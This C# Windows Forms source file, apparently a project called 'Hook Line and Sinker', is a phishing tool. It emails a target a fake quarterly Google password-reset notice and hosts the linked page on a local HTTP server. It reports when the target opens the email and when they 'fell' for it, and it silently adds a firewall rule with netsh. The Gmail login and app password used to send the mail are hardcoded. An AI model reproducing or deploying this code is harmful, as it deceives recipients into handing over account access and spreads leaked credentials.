using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace Hook_Line_and_Sinker
{
    public partial class Form1 : Form
    {
        private HttpListener listener;
        private Thread serverThread;
        private string ip;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.FormClosing += Form1_FormClosing;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                ip = endPoint.Address.ToString();
            }

            listener = new HttpListener();
            listener.Prefixes.Add("http://" + ip + ":3000/");
            serverThread = new Thread(new ThreadStart(StartServer));
            serverThread.Start();

            int port = 3000;
            string protocol = "TCP";

            AddFirewallPortRule(port, protocol);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential("carsonouckama@gmail.com", "zuke bgmx oncc pifu"),
                EnableSsl = true,
            };

            var mailMessage = new MailMessage
            {
                From = new MailAddress("carsonouckama@gmail.com"),
                Subject = "Routinely Password Reset",
                Body = "<h1>Routinely Password Reset</h1>" +
                "<p>Hello " + textBox2.Text + ",</p>" +
                "<p>Every quarter to keep your google account safe, we need you to reset your password.</p>" +
                "<p>Head over to <a href=\"http://" + ip + ":3000/\">this</a> page to proceed with instruction.</p>" +
                "<p>Thanks again!<br>- Management</p>",
                IsBodyHtml = true,
            };
            mailMessage.To.Add(textBox1.Text);

            smtpClient.Send(mailMessage);
            label3.Text = "Status: " + "Message Sent to " + textBox1.Text;


        }

        private void StartServer()
        {
            listener.Start();

            while (listener.IsListening)
            {
                try
                {
                    HttpListenerContext context = listener.GetContext();

                    HandleRequest(context);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }

        private void HandleRequest(HttpListenerContext context)
        {
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response;

            Debug.WriteLine($"Request received: {request.HttpMethod} {request.Url}");

            if (request.Url.ToString() == "http://" + ip + ":3000/")
            {
                string responseString = File.ReadAllText("index.html");
                byte[] buffer = Encoding.UTF8.GetBytes(responseString);

                response.ContentType = "text/html";
                response.ContentLength64 = buffer.Length;

                response.OutputStream.Write(buffer, 0, buffer.Length);

                label3.Invoke(SetEmailOpen);
            }
            else if (request.Url.ToString() == "http://" + ip + ":3000/failure")
            {
                string responseString = File.ReadAllText("failure.html");
                byte[] buffer = Encoding.UTF8.GetBytes(responseString);

                response.ContentType = "text/html";
                response.ContentLength64 = buffer.Length;

                response.OutputStream.Write(buffer, 0, buffer.Length);

                label3.Invoke(SetFail);
            }

            response.Close();
        }

        private void SetEmailOpen()
        {
            label3.Text = "Status: " + textBox2.Text + " opened the email.";
        }

        private void SetFail()
        {
            label3.Text = "Status: " + textBox2.Text + " fell... hook line and sinker.";
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (listener != null && listener.IsListening)
            {
                listener.Stop();
            }
        }

        static void AddFirewallPortRule(int port, string protocol)
        {
            string arguments = $"advfirewall firewall add rule name=\"Hook Line and Sinker\" dir=in action=allow protocol={protocol} localport={port}";

            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = arguments,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            try
            {
                using (Process process = new Process { StartInfo = processInfo })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    Console.WriteLine(output);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }

}


